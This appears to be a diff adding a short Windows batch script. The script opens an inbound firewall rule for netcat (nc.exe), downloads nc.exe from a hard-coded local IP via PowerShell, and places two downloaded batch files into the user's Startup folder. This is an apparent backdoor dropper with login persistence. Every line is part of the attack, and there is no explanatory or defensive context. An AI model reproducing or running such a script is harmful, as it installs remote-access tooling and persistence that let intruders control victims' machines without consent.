@@ -1,0 +1,6 @@
+netsh advfirewall firewall add rule name=\"nc.exe\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes
+cd %AppData%\Microsoft
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.12/nc.exe', 'nc.exe')
+cd %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.12/main.bat', 'main.bat')
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.12/start.bat', 'start.bat')
